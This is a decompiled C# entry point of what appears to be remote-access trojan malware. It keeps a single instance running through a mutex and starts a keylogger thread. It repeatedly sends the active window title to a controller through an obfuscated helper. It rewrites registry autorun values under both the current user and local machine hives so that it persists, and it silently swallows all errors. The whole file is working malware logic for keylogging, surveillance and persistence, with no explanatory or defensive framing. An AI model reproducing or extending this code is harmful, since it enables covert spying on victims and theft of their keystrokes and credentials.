using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns0;

namespace ClassLibrary1;

public class A
{
	[STAThread]
	public static void main()
	{
		//IL_017f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0189: Expected O, but got Unknown
		if (Interaction.Command() != null && Interaction.Command().Length > 0)
		{
			string[] array = Strings.Split(Interaction.Command(), ":", -1, (CompareMethod)0);
			string text = array[0];
			if (Operators.CompareString(text, "UP", false) == 0)
			{
				try
				{
					((ServerComputer)Class0.computer_0).get_Registry().get_CurrentUser().SetValue("di", "!");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					Process processById = Process.GetProcessById(Conversions.ToInteger(array[1]));
					processById.WaitForExit(5000);
					try
					{
						processById.Dispose();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					Thread.Sleep(5000);
					ProjectData.ClearProjectError();
				}
			}
			else if (Operators.CompareString(text, "..", false) == 0)
			{
				Thread.Sleep(5000);
			}
		}
		try
		{
			Mutex.OpenExisting(Class0.string_4);
			ProjectData.EndApp();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			bool createdNew = false;
			Class0.mutex_0 = new Mutex(initiallyOwned: true, Class0.string_4, out createdNew);
			if (!createdNew)
			{
				ProjectData.EndApp();
			}
			ProjectData.ClearProjectError();
		}
		Class0.smethod_18();
		Thread thread = new Thread(Class0.smethod_28, 1);
		thread.Start();
		try
		{
			Class0.kl_0 = new kl();
			thread = new Thread(Class0.kl_0.WRK, 1);
			thread.Start();
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		int num = 0;
		string text2 = "";
		if (Class0.bool_0)
		{
			try
			{
				SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
				{
					Class0.smethod_16();
				});
				Class0.smethod_24(1);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		while (true)
		{
			Thread.Sleep(1000);
			Application.DoEvents();
			try
			{
				num = checked(num + 1);
				if (num == 5)
				{
					try
					{
						Class0.EmptyWorkingSet((long)Process.GetCurrentProcess().Handle);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
				}
				if (num > 8)
				{
					num = 0;
					string text3 = Class0.smethod_13();
					if (Operators.CompareString(text2, text3, false) != 0)
					{
						text2 = text3;
						Class0.smethod_26("act" + Class0.string_7 + text3);
					}
				}
				if (!Class0.bool_3)
				{
					continue;
				}
				try
				{
					if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)Class0.computer_0).get_Registry().get_CurrentUser().GetValue(Class0.string_9 + "\\" + Class0.string_4, ""), (object)("\"" + Class0.fileInfo_0.FullName + "\" .."), false))
					{
						((ServerComputer)Class0.computer_0).get_Registry().get_CurrentUser().OpenSubKey(Class0.string_9, writable: true)!.SetValue(Class0.string_4, "\"" + Class0.fileInfo_0.FullName + "\" ..");
					}
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)Class0.computer_0).get_Registry().get_LocalMachine().GetValue(Class0.string_9 + "\\" + Class0.string_4, ""), (object)("\"" + Class0.fileInfo_0.FullName + "\" .."), false))
					{
						((ServerComputer)Class0.computer_0).get_Registry().get_LocalMachine().OpenSubKey(Class0.string_9, writable: true)!.SetValue(Class0.string_4, "\"" + Class0.fileInfo_0.FullName + "\" ..");
					}
				}
				catch (Exception projectError9)
				{
					ProjectData.SetProjectError(projectError9);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
		}
	}

	[SpecialName]
	private static void _Lambda_0024__4(object sender, SessionEndingEventArgs e)
	{
		Class0.smethod_16();
	}
}
